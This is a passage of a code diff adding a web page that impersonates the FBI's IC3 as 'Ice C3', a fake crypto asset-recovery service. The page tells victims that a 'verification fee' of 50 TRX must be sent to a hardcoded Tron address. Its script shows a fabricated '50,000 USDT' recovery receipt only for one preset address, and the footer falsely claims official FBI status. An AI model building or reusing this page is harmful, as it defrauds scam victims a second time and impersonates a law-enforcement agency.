+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="alert-content">
+                        <h3>No Recovery Found</h3>
+                        <p>The USDT address provided does not match any active recovery case in our system.</p>
+                        <p class="alert-detail">This may occur if:</p>
+                        <ul class="alert-list">
+                            <li>The address was entered incorrectly</li>
+                            <li>Your case is still under initial review</li>
+                            <li>Additional verification is required</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- IC3 Duties and Process -->
+                <div class="duties-section">
+                    <h3>IC3 Recovery Process</h3>
+                    <div class="duties-grid">
+                        <div class="duty-card">
+                            <div class="duty-number">1</div>
+                            <h4>Case Registration</h4>
+                            <p>Your case is registered in our secure database and assigned a unique case number for tracking.</p>
+                        </div>
+
+                        <div class="duty-card">
+                            <div class="duty-number">2</div>
+                            <h4>Initial Investigation</h4>
+                            <p>Our team conducts a comprehensive investigation of the fraud or theft claim you've reported.</p>
+                        </div>
+
+                        <div class="duty-card">
+                            <div class="duty-number">3</div>
+                            <h4>Asset Tracing</h4>
+                            <p>We trace your lost assets across blockchain networks and coordinate with exchanges.</p>
+                        </div>
+
+                        <div class="duty-card">
+                            <div class="duty-number">4</div>
+                            <h4>Recovery Coordination</h4>
+                            <p>Once assets are located, we coordinate with authorities for secure recovery and transfer.</p>
+                        </div>
+
+                        <div class="duty-card">
+                            <div class="duty-number">5</div>
+                            <h4>Final Verification</h4>
+                            <p>A small verification fee may be required to finalize the recovery process and complete all formalities.</p>
+                        </div>
+
+                        <div class="duty-card">
+                            <div class="duty-number">6</div>
+                            <h4>Asset Transfer</h4>
+                            <p>Upon verification, your recovered assets are securely transferred to your designated wallet.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Verification Fee Section -->
+                <div class="verification-fee-section">
+                    <h3>Final Verification Required</h3>
+                    <div class="fee-card">
+                        <div class="fee-details">
+                            <p class="fee-description">To complete your recovery case and ensure all legal formalities are satisfied, a verification fee is required:</p>
+                            
+                            <div class="fee-amount-box">
+                                <span class="fee-label">Verification Fee:</span>
+                                <span class="fee-value">50 TRX</span>
+                            </div>
+
+                            <p class="fee-explanation">This fee covers:</p>
+                            <ul class="fee-list">
+                                <li><strong>Legal Processing:</strong> Official documentation and case finalization</li>
+                                <li><strong>Blockchain Verification:</strong> Smart contract verification and security audit</li>
+                                <li><strong>Transfer Security:</strong> Secure wallet verification and multi-signature approval</li>
+                                <li><strong>Regulatory Compliance:</strong> Compliance with international anti-fraud regulations</li>
+                            </ul>
+
+                            <div class="fee-payment-box">
+                                <p class="fee-instruction"><strong>Send 50 TRX to:</strong></p>
+                                <div class="fee-address">
+                                    <code>TQ6TzjQ6mFmwU7cTKtkPgXTrDQrfJRWmTR</code>
+                                    <button type="button" class="copy-btn" onclick="copyToClipboard('TQ6TzjQ6mFmwU7cTKtkPgXTrDQrfJRWmTR')">
+                                        <i class="fas fa-copy"></i> Copy Address
+                                    </button>
+                                </div>
+                                <p class="fee-note">Once payment is confirmed, your recovery will be processed within 24-48 hours.</p>
+                            </div>
+                        </div>
+
+                        <div class="fee-info-box">
+                            <h4><i class="fas fa-shield-alt"></i> Security Assurance</h4>
+                            <p>Your payment is protected by our multi-signature wallet system and verified through blockchain technology. All transactions are transparent and traceable.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <button type="button" class="back-btn" onclick="resetForm()">
+                        <i class="fas fa-arrow-left"></i> Try Different Address
+                    </button>
+                    <button type="button" class="help-btn" onclick="alert('Contact support at support@ic3.gov or call 1-800-IC3-HELP')">
+                        <i class="fas fa-question-circle"></i> Need Help?
+                    </button>
+                </div>
+            </div>
+
+            <!-- Dashboard Section (Hidden until successful verification) -->
+            <div class="dashboard-section" id="dashboardSection" style="display: none;">
+                <div class="section-header">
+                    <h2>Recovery Dashboard</h2>
+                    <p class="section-subtitle" id="welcomeText"></p>
+                </div>
+
+                <!-- Transaction Receipt -->
+                <div class="receipt-container">
+                    <div class="receipt">
+                        <!-- Receipt Header -->
+                        <div class="receipt-header">
+                            <div class="receipt-logo">
+                                <img src="https://via.placeholder.com/80/667eea/ffffff?text=IC3" alt="Ice C3">
+                            </div>
+                            <div class="receipt-title">
+                                <h2>TRANSACTION RECEIPT</h2>
+                                <p>Ice C3 - Appointment Recovery Service</p>
+                            </div>
+                        </div>
+
+                        <!-- Receipt Divider -->
+                        <div class="receipt-divider"></div>
+
+                        <!-- Transaction Details -->
+                        <div class="receipt-section">
+                            <h3>Transaction Information</h3>
+                            <div class="receipt-details">
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Transaction ID:</span>
+                                    <span class="receipt-value" id="txId"></span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Date & Time:</span>
+                                    <span class="receipt-value" id="txDateTime"></span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Status:</span>
+                                    <span class="receipt-value status-confirmed">
+                                        <i class="fas fa-check-circle"></i> Confirmed
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Receipt Divider -->
+                        <div class="receipt-divider"></div>
+
+                        <!-- Beneficiary Information -->
+                        <div class="receipt-section">
+                            <h3>Beneficiary Details</h3>
+                            <div class="receipt-details">
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Name:</span>
+                                    <span class="receipt-value" id="beneficiaryName"></span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Email:</span>
+                                    <span class="receipt-value" id="beneficiaryEmail"></span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Country:</span>
+                                    <span class="receipt-value" id="beneficiaryCountry"></span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Receipt Divider -->
+                        <div class="receipt-divider"></div>
+
+                        <!-- Recovery Amount -->
+                        <div class="receipt-section">
+                            <h3>Recovery Amount</h3>
+                            <div class="amount-box">
+                                <div class="amount-main">
+                                    <span class="amount-value">50,000</span>
+                                    <span class="amount-currency">USDT</span>
+                                </div>
+                                <div class="amount-equivalent">
+                                    <span class="amount-label">Approximate Value:</span>
+                                    <span class="amount-value-equiv">€50,000</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Receipt Divider -->
+                        <div class="receipt-divider"></div>
+
+                        <!-- Transfer Details -->
+                        <div class="receipt-section">
+                            <h3>Transfer Details</h3>
+                            <div class="receipt-details">
+                                <div class="receipt-row">
+                                    <span class="receipt-label">From:</span>
+                                    <span class="receipt-value">IC3 Recovery Pool</span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Network:</span>
+                                    <span class="receipt-value">Tron Blockchain (TRC-20)</span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">To Address:</span>
+                                    <span class="receipt-value address-highlight" id="receiptToAddress"></span>
+                                </div>
+                                <div class="receipt-row">
+                                    <span class="receipt-label">Gas Fee:</span>
+                                    <span class="receipt-value">1 TRX</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Receipt Divider -->
+                        <div class="receipt-divider"></div>
+
+                        <!-- Processing Status -->
+                        <div class="receipt-section">
+                            <h3>Processing Status</h3>
+                            <div class="status-timeline">
+                                <div class="status-item completed">
+                                    <div class="status-dot"></div>
+                                    <div class="status-text">
+                                        <strong>Address Verified</strong>
+                                        <p>Your wallet address has been verified and confirmed</p>
+                                    </div>
+                                </div>
+                                <div class="status-item completed">
+                                    <div class="status-dot"></div>
+                                    <div class="status-text">
+                                        <strong>Recovery Processed</strong>
+                                        <p>Your assets have been approved for recovery</p>
+                                    </div>
+                                </div>
+                                <div class="status-item active">
+                                    <div class="status-dot"></div>
+                                    <div class="status-text">
+                                        <strong>Finalizing Transfer</strong>
+                                        <p>Transfer is being processed on the blockchain</p>
+                                    </div>
+                                </div>
+                                <div class="status-item">
+                                    <div class="status-dot"></div>
+                                    <div class="status-text">
+                                        <strong>Funds Received</strong>
+                                        <p>Complete - funds available in your wallet</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Receipt Divider -->
+                        <div class="receipt-divider"></div>
+
+                        <!-- Receipt Footer -->
+                        <div class="receipt-footer">
+                            <p><strong>Estimated Completion:</strong> <span id="estimatedTime">24-48 hours</span></p>
+                            <p class="receipt-note">This is an official transaction receipt. Please save it for your records.</p>
+                            <p class="receipt-security">
+                                <i class="fas fa-lock"></i> This transaction is secured with military-grade encryption
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Dashboard Stats -->
+                <div class="dashboard-stats">
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h4>Total Holdings</h4>
+                            <p class="stat-value">€50,000</p>
+                            <span class="stat-label">EUR Equivalent</span>
+                        </div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-coins"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h4>Recovery Amount</h4>
+                            <p class="stat-value">50,000 USDT</p>
+                            <span class="stat-label">TRC-20 Token</span>
+                        </div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-spinner"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h4>Current Status</h4>
+                            <p class="stat-value" style="color: #f39c12;">Processing</p>
+                            <span class="stat-label">In Progress</span>
+                        </div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <div class="stat-info">
+                            <h4>Verification</h4>
+                            <p class="stat-value" style="color: #2ecc71;">Confirmed</p>
+                            <span class="stat-label">Address Verified</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Action Buttons -->
+                <div class="action-buttons">
+                    <button type="button" class="download-btn" onclick="downloadReceipt()">
+                        <i class="fas fa-download"></i> Download Receipt
+                    </button>
+                    <button type="button" class="back-btn" onclick="resetForm()">
+                        <i class="fas fa-home"></i> Back to Home
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <p>&copy; 2026 Ice C3 - International Cyber Crime Complaint Center. All rights reserved.</p>
+                <p>This is an official service of the Federal Bureau of Investigation (FBI) in partnership with NW3C and BJA.</p>
+                <p class="footer-security"><i class="fas fa-shield-alt"></i> Your security and privacy are our top priorities.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Valid USDT address for recovery
+        const VALID_USDT_ADDRESS = 'TKVwcWjCUrZTopBPN5Gf4AiPXxqfzuUniH';
+        const VERIFICATION_FEE_ADDRESS = 'TQ6TzjQ6mFmwU7cTKtkPgXTrDQrfJRWmTR';
+
+        document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const usdtAddress = document.getElementById('usdtAddress').value.trim();
+            const country = document.getElementById('country').value;
+            
+            // Clear previous errors
+            clearErrors();
+            
+            // Validate inputs
+            if (!validateForm(name, email, usdtAddress, country)) {
+                return;
+            }
+            
+            // Check if address matches
+            if (usdtAddress === VALID_USDT_ADDRESS) {
+                // Show dashboard with recovery
+                showDashboard(name, email, usdtAddress, country);
+            } else {
+                // Show no recovery found screen
+                showNoRecoveryFound(name, email, usdtAddress, country);
+            }
+        });
+
+        function validateForm(name, email, usdtAddress, country) {
+            let isValid = true;
+            
+            // Validate name
+            if (!name || name.length < 2) {
+                showError('nameError', 'Please enter a valid name (minimum 2 characters)');
+                isValid = false;
+            }
+            
+            // Validate email
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!email || !emailRegex.test(email)) {
+                showError('emailError', 'Please enter a valid email address');
+                isValid = false;
+            }
+            
+            // Validate USDT address
+            if (!usdtAddress.startsWith('T') || usdtAddress.length !== 34 || !isValidTronAddress(usdtAddress)) {
+                showError('addressError', 'Please enter a valid USDT address (TRC-20 format, 34 
